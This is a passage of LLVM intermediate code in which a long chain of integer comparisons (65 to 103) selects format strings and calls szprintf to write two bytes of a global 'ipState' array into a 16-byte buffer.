  %675 = call i32 (i8*, i8*, ...) @szprintf(i8* %670, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.106, i32 0, i32 0), i32 %672, i32 %674)
  br label %676

; <label>:676:                                    ; preds = %669, %666
  %677 = load i32, i32* %1, align 4
  %678 = icmp eq i32 %677, 65
  br i1 %678, label %679, label %686

; <label>:679:                                    ; preds = %676
  %680 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %681 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %682 = zext i8 %681 to i32
  %683 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %684 = zext i8 %683 to i32
  %685 = call i32 (i8*, i8*, ...) @szprintf(i8* %680, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.107, i32 0, i32 0), i32 %682, i32 %684)
  br label %686

; <label>:686:                                    ; preds = %679, %676
  %687 = load i32, i32* %1, align 4
  %688 = icmp eq i32 %687, 66
  br i1 %688, label %689, label %696

; <label>:689:                                    ; preds = %686
  %690 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %691 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %692 = zext i8 %691 to i32
  %693 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %694 = zext i8 %693 to i32
  %695 = call i32 (i8*, i8*, ...) @szprintf(i8* %690, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.108, i32 0, i32 0), i32 %692, i32 %694)
  br label %696

; <label>:696:                                    ; preds = %689, %686
  %697 = load i32, i32* %1, align 4
  %698 = icmp eq i32 %697, 67
  br i1 %698, label %699, label %706

; <label>:699:                                    ; preds = %696
  %700 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %701 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %702 = zext i8 %701 to i32
  %703 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %704 = zext i8 %703 to i32
  %705 = call i32 (i8*, i8*, ...) @szprintf(i8* %700, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.109, i32 0, i32 0), i32 %702, i32 %704)
  br label %706

; <label>:706:                                    ; preds = %699, %696
  %707 = load i32, i32* %1, align 4
  %708 = icmp eq i32 %707, 68
  br i1 %708, label %709, label %716

; <label>:709:                                    ; preds = %706
  %710 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %711 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %712 = zext i8 %711 to i32
  %713 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %714 = zext i8 %713 to i32
  %715 = call i32 (i8*, i8*, ...) @szprintf(i8* %710, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.110, i32 0, i32 0), i32 %712, i32 %714)
  br label %716

; <label>:716:                                    ; preds = %709, %706
  %717 = load i32, i32* %1, align 4
  %718 = icmp eq i32 %717, 69
  br i1 %718, label %719, label %726

; <label>:719:                                    ; preds = %716
  %720 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %721 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %722 = zext i8 %721 to i32
  %723 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %724 = zext i8 %723 to i32
  %725 = call i32 (i8*, i8*, ...) @szprintf(i8* %720, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.111, i32 0, i32 0), i32 %722, i32 %724)
  br label %726

; <label>:726:                                    ; preds = %719, %716
  %727 = load i32, i32* %1, align 4
  %728 = icmp eq i32 %727, 70
  br i1 %728, label %729, label %736

; <label>:729:                                    ; preds = %726
  %730 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %731 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %732 = zext i8 %731 to i32
  %733 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %734 = zext i8 %733 to i32
  %735 = call i32 (i8*, i8*, ...) @szprintf(i8* %730, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.112, i32 0, i32 0), i32 %732, i32 %734)
  br label %736

; <label>:736:                                    ; preds = %729, %726
  %737 = load i32, i32* %1, align 4
  %738 = icmp eq i32 %737, 71
  br i1 %738, label %739, label %746

; <label>:739:                                    ; preds = %736
  %740 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %741 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %742 = zext i8 %741 to i32
  %743 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %744 = zext i8 %743 to i32
  %745 = call i32 (i8*, i8*, ...) @szprintf(i8* %740, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i32 %742, i32 %744)
  br label %746

; <label>:746:                                    ; preds = %739, %736
  %747 = load i32, i32* %1, align 4
  %748 = icmp eq i32 %747, 72
  br i1 %748, label %749, label %756

; <label>:749:                                    ; preds = %746
  %750 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %751 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %752 = zext i8 %751 to i32
  %753 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %754 = zext i8 %753 to i32
  %755 = call i32 (i8*, i8*, ...) @szprintf(i8* %750, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i32 %752, i32 %754)
  br label %756

; <label>:756:                                    ; preds = %749, %746
  %757 = load i32, i32* %1, align 4
  %758 = icmp eq i32 %757, 73
  br i1 %758, label %759, label %766

; <label>:759:                                    ; preds = %756
  %760 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %761 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %762 = zext i8 %761 to i32
  %763 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %764 = zext i8 %763 to i32
  %765 = call i32 (i8*, i8*, ...) @szprintf(i8* %760, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 %762, i32 %764)
  br label %766

; <label>:766:                                    ; preds = %759, %756
  %767 = load i32, i32* %1, align 4
  %768 = icmp eq i32 %767, 74
  br i1 %768, label %769, label %776

; <label>:769:                                    ; preds = %766
  %770 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %771 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %772 = zext i8 %771 to i32
  %773 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %774 = zext i8 %773 to i32
  %775 = call i32 (i8*, i8*, ...) @szprintf(i8* %770, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.114, i32 0, i32 0), i32 %772, i32 %774)
  br label %776

; <label>:776:                                    ; preds = %769, %766
  %777 = load i32, i32* %1, align 4
  %778 = icmp eq i32 %777, 75
  br i1 %778, label %779, label %786

; <label>:779:                                    ; preds = %776
  %780 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %781 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %782 = zext i8 %781 to i32
  %783 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %784 = zext i8 %783 to i32
  %785 = call i32 (i8*, i8*, ...) @szprintf(i8* %780, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.115, i32 0, i32 0), i32 %782, i32 %784)
  br label %786

; <label>:786:                                    ; preds = %779, %776
  %787 = load i32, i32* %1, align 4
  %788 = icmp eq i32 %787, 76
  br i1 %788, label %789, label %796

; <label>:789:                                    ; preds = %786
  %790 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %791 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %792 = zext i8 %791 to i32
  %793 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %794 = zext i8 %793 to i32
  %795 = call i32 (i8*, i8*, ...) @szprintf(i8* %790, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.116, i32 0, i32 0), i32 %792, i32 %794)
  br label %796

; <label>:796:                                    ; preds = %789, %786
  %797 = load i32, i32* %1, align 4
  %798 = icmp eq i32 %797, 77
  br i1 %798, label %799, label %806

; <label>:799:                                    ; preds = %796
  %800 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %801 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %802 = zext i8 %801 to i32
  %803 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %804 = zext i8 %803 to i32
  %805 = call i32 (i8*, i8*, ...) @szprintf(i8* %800, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.117, i32 0, i32 0), i32 %802, i32 %804)
  br label %806

; <label>:806:                                    ; preds = %799, %796
  %807 = load i32, i32* %1, align 4
  %808 = icmp eq i32 %807, 78
  br i1 %808, label %809, label %816

; <label>:809:                                    ; preds = %806
  %810 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %811 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %812 = zext i8 %811 to i32
  %813 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %814 = zext i8 %813 to i32
  %815 = call i32 (i8*, i8*, ...) @szprintf(i8* %810, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.118, i32 0, i32 0), i32 %812, i32 %814)
  br label %816

; <label>:816:                                    ; preds = %809, %806
  %817 = load i32, i32* %1, align 4
  %818 = icmp eq i32 %817, 79
  br i1 %818, label %819, label %826

; <label>:819:                                    ; preds = %816
  %820 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %821 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %822 = zext i8 %821 to i32
  %823 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %824 = zext i8 %823 to i32
  %825 = call i32 (i8*, i8*, ...) @szprintf(i8* %820, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.119, i32 0, i32 0), i32 %822, i32 %824)
  br label %826

; <label>:826:                                    ; preds = %819, %816
  %827 = load i32, i32* %1, align 4
  %828 = icmp eq i32 %827, 80
  br i1 %828, label %829, label %836

; <label>:829:                                    ; preds = %826
  %830 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %831 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %832 = zext i8 %831 to i32
  %833 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %834 = zext i8 %833 to i32
  %835 = call i32 (i8*, i8*, ...) @szprintf(i8* %830, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.120, i32 0, i32 0), i32 %832, i32 %834)
  br label %836

; <label>:836:                                    ; preds = %829, %826
  %837 = load i32, i32* %1, align 4
  %838 = icmp eq i32 %837, 81
  br i1 %838, label %839, label %846

; <label>:839:                                    ; preds = %836
  %840 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %841 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %842 = zext i8 %841 to i32
  %843 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %844 = zext i8 %843 to i32
  %845 = call i32 (i8*, i8*, ...) @szprintf(i8* %840, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.121, i32 0, i32 0), i32 %842, i32 %844)
  br label %846

; <label>:846:                                    ; preds = %839, %836
  %847 = load i32, i32* %1, align 4
  %848 = icmp eq i32 %847, 82
  br i1 %848, label %849, label %856

; <label>:849:                                    ; preds = %846
  %850 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %851 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %852 = zext i8 %851 to i32
  %853 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %854 = zext i8 %853 to i32
  %855 = call i32 (i8*, i8*, ...) @szprintf(i8* %850, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.122, i32 0, i32 0), i32 %852, i32 %854)
  br label %856

; <label>:856:                                    ; preds = %849, %846
  %857 = load i32, i32* %1, align 4
  %858 = icmp eq i32 %857, 83
  br i1 %858, label %859, label %866

; <label>:859:                                    ; preds = %856
  %860 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %861 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %862 = zext i8 %861 to i32
  %863 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %864 = zext i8 %863 to i32
  %865 = call i32 (i8*, i8*, ...) @szprintf(i8* %860, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.123, i32 0, i32 0), i32 %862, i32 %864)
  br label %866

; <label>:866:                                    ; preds = %859, %856
  %867 = load i32, i32* %1, align 4
  %868 = icmp eq i32 %867, 84
  br i1 %868, label %869, label %876

; <label>:869:                                    ; preds = %866
  %870 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %871 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %872 = zext i8 %871 to i32
  %873 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %874 = zext i8 %873 to i32
  %875 = call i32 (i8*, i8*, ...) @szprintf(i8* %870, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.124, i32 0, i32 0), i32 %872, i32 %874)
  br label %876

; <label>:876:                                    ; preds = %869, %866
  %877 = load i32, i32* %1, align 4
  %878 = icmp eq i32 %877, 85
  br i1 %878, label %879, label %886

; <label>:879:                                    ; preds = %876
  %880 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %881 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %882 = zext i8 %881 to i32
  %883 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %884 = zext i8 %883 to i32
  %885 = call i32 (i8*, i8*, ...) @szprintf(i8* %880, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.125, i32 0, i32 0), i32 %882, i32 %884)
  br label %886

; <label>:886:                                    ; preds = %879, %876
  %887 = load i32, i32* %1, align 4
  %888 = icmp eq i32 %887, 86
  br i1 %888, label %889, label %896

; <label>:889:                                    ; preds = %886
  %890 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %891 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %892 = zext i8 %891 to i32
  %893 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %894 = zext i8 %893 to i32
  %895 = call i32 (i8*, i8*, ...) @szprintf(i8* %890, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.126, i32 0, i32 0), i32 %892, i32 %894)
  br label %896

; <label>:896:                                    ; preds = %889, %886
  %897 = load i32, i32* %1, align 4
  %898 = icmp eq i32 %897, 87
  br i1 %898, label %899, label %906

; <label>:899:                                    ; preds = %896
  %900 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %901 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %902 = zext i8 %901 to i32
  %903 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %904 = zext i8 %903 to i32
  %905 = call i32 (i8*, i8*, ...) @szprintf(i8* %900, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.127, i32 0, i32 0), i32 %902, i32 %904)
  br label %906

; <label>:906:                                    ; preds = %899, %896
  %907 = load i32, i32* %1, align 4
  %908 = icmp eq i32 %907, 88
  br i1 %908, label %909, label %916

; <label>:909:                                    ; preds = %906
  %910 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %911 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %912 = zext i8 %911 to i32
  %913 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %914 = zext i8 %913 to i32
  %915 = call i32 (i8*, i8*, ...) @szprintf(i8* %910, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.128, i32 0, i32 0), i32 %912, i32 %914)
  br label %916

; <label>:916:                                    ; preds = %909, %906
  %917 = load i32, i32* %1, align 4
  %918 = icmp eq i32 %917, 89
  br i1 %918, label %919, label %926

; <label>:919:                                    ; preds = %916
  %920 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %921 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %922 = zext i8 %921 to i32
  %923 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %924 = zext i8 %923 to i32
  %925 = call i32 (i8*, i8*, ...) @szprintf(i8* %920, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.129, i32 0, i32 0), i32 %922, i32 %924)
  br label %926

; <label>:926:                                    ; preds = %919, %916
  %927 = load i32, i32* %1, align 4
  %928 = icmp eq i32 %927, 90
  br i1 %928, label %929, label %936

; <label>:929:                                    ; preds = %926
  %930 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %931 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %932 = zext i8 %931 to i32
  %933 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %934 = zext i8 %933 to i32
  %935 = call i32 (i8*, i8*, ...) @szprintf(i8* %930, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.130, i32 0, i32 0), i32 %932, i32 %934)
  br label %936

; <label>:936:                                    ; preds = %929, %926
  %937 = load i32, i32* %1, align 4
  %938 = icmp eq i32 %937, 91
  br i1 %938, label %939, label %946

; <label>:939:                                    ; preds = %936
  %940 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %941 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %942 = zext i8 %941 to i32
  %943 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %944 = zext i8 %943 to i32
  %945 = call i32 (i8*, i8*, ...) @szprintf(i8* %940, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.131, i32 0, i32 0), i32 %942, i32 %944)
  br label %946

; <label>:946:                                    ; preds = %939, %936
  %947 = load i32, i32* %1, align 4
  %948 = icmp eq i32 %947, 92
  br i1 %948, label %949, label %956

; <label>:949:                                    ; preds = %946
  %950 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %951 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %952 = zext i8 %951 to i32
  %953 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %954 = zext i8 %953 to i32
  %955 = call i32 (i8*, i8*, ...) @szprintf(i8* %950, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i32 0, i32 0), i32 %952, i32 %954)
  br label %956

; <label>:956:                                    ; preds = %949, %946
  %957 = load i32, i32* %1, align 4
  %958 = icmp eq i32 %957, 93
  br i1 %958, label %959, label %966

; <label>:959:                                    ; preds = %956
  %960 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %961 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %962 = zext i8 %961 to i32
  %963 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %964 = zext i8 %963 to i32
  %965 = call i32 (i8*, i8*, ...) @szprintf(i8* %960, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.121, i32 0, i32 0), i32 %962, i32 %964)
  br label %966

; <label>:966:                                    ; preds = %959, %956
  %967 = load i32, i32* %1, align 4
  %968 = icmp eq i32 %967, 94
  br i1 %968, label %969, label %976

; <label>:969:                                    ; preds = %966
  %970 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %971 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %972 = zext i8 %971 to i32
  %973 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %974 = zext i8 %973 to i32
  %975 = call i32 (i8*, i8*, ...) @szprintf(i8* %970, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.133, i32 0, i32 0), i32 %972, i32 %974)
  br label %976

; <label>:976:                                    ; preds = %969, %966
  %977 = load i32, i32* %1, align 4
  %978 = icmp eq i32 %977, 95
  br i1 %978, label %979, label %986

; <label>:979:                                    ; preds = %976
  %980 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %981 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %982 = zext i8 %981 to i32
  %983 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %984 = zext i8 %983 to i32
  %985 = call i32 (i8*, i8*, ...) @szprintf(i8* %980, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.134, i32 0, i32 0), i32 %982, i32 %984)
  br label %986

; <label>:986:                                    ; preds = %979, %976
  %987 = load i32, i32* %1, align 4
  %988 = icmp eq i32 %987, 96
  br i1 %988, label %989, label %996

; <label>:989:                                    ; preds = %986
  %990 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %991 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %992 = zext i8 %991 to i32
  %993 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %994 = zext i8 %993 to i32
  %995 = call i32 (i8*, i8*, ...) @szprintf(i8* %990, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.135, i32 0, i32 0), i32 %992, i32 %994)
  br label %996

; <label>:996:                                    ; preds = %989, %986
  %997 = load i32, i32* %1, align 4
  %998 = icmp eq i32 %997, 97
  br i1 %998, label %999, label %1006

; <label>:999:                                    ; preds = %996
  %1000 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1001 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1002 = zext i8 %1001 to i32
  %1003 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1004 = zext i8 %1003 to i32
  %1005 = call i32 (i8*, i8*, ...) @szprintf(i8* %1000, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.134, i32 0, i32 0), i32 %1002, i32 %1004)
  br label %1006

; <label>:1006:                                   ; preds = %999, %996
  %1007 = load i32, i32* %1, align 4
  %1008 = icmp eq i32 %1007, 98
  br i1 %1008, label %1009, label %1016

; <label>:1009:                                   ; preds = %1006
  %1010 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1011 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1012 = zext i8 %1011 to i32
  %1013 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1014 = zext i8 %1013 to i32
  %1015 = call i32 (i8*, i8*, ...) @szprintf(i8* %1010, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.136, i32 0, i32 0), i32 %1012, i32 %1014)
  br label %1016

; <label>:1016:                                   ; preds = %1009, %1006
  %1017 = load i32, i32* %1, align 4
  %1018 = icmp eq i32 %1017, 99
  br i1 %1018, label %1019, label %1026

; <label>:1019:                                   ; preds = %1016
  %1020 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1021 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1022 = zext i8 %1021 to i32
  %1023 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1024 = zext i8 %1023 to i32
  %1025 = call i32 (i8*, i8*, ...) @szprintf(i8* %1020, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.137, i32 0, i32 0), i32 %1022, i32 %1024)
  br label %1026

; <label>:1026:                                   ; preds = %1019, %1016
  %1027 = load i32, i32* %1, align 4
  %1028 = icmp eq i32 %1027, 100
  br i1 %1028, label %1029, label %1036

; <label>:1029:                                   ; preds = %1026
  %1030 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1031 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1032 = zext i8 %1031 to i32
  %1033 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1034 = zext i8 %1033 to i32
  %1035 = call i32 (i8*, i8*, ...) @szprintf(i8* %1030, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.138, i32 0, i32 0), i32 %1032, i32 %1034)
  br label %1036

; <label>:1036:                                   ; preds = %1029, %1026
  %1037 = load i32, i32* %1, align 4
  %1038 = icmp eq i32 %1037, 101
  br i1 %1038, label %1039, label %1046

; <label>:1039:                                   ; preds = %1036
  %1040 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1041 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1042 = zext i8 %1041 to i32
  %1043 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1044 = zext i8 %1043 to i32
  %1045 = call i32 (i8*, i8*, ...) @szprintf(i8* %1040, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.139, i32 0, i32 0), i32 %1042, i32 %1044)
  br label %1046

; <label>:1046:                                   ; preds = %1039, %1036
  %1047 = load i32, i32* %1, align 4
  %1048 = icmp eq i32 %1047, 102
  br i1 %1048, label %1049, label %1056

; <label>:1049:                                   ; preds = %1046
  %1050 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1051 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1052 = zext i8 %1051 to i32
  %1053 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1054 = zext i8 %1053 to i32
  %1055 = call i32 (i8*, i8*, ...) @szprintf(i8* %1050, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.140, i32 0, i32 0), i32 %1052, i32 %1054)
  br label %1056

; <label>:1056:                                   ; preds = %1049, %1046
  %1057 = load i32, i32* %1, align 4
  %1058 = icmp eq i32 %1057, 103
  br i1 %1058, label %1059, label %1066

; <label>:1059:                                   ; preds = %1056
  %1060 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %1061 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %1062 = zext i8 %1061 to i32
  %1063 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %1064 = zext i8 %1063 to i32
  %1065 = call i32 (i8*, i8*, ...) @szprintf(i8* %1060, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.141, i32 0, i32 0), i32 %1062, i32 %1064)
  br label %1066

; <label>:1066:                                   ; preds = %1059, %1056
  %1067 = load i32, i32* %1, align 4
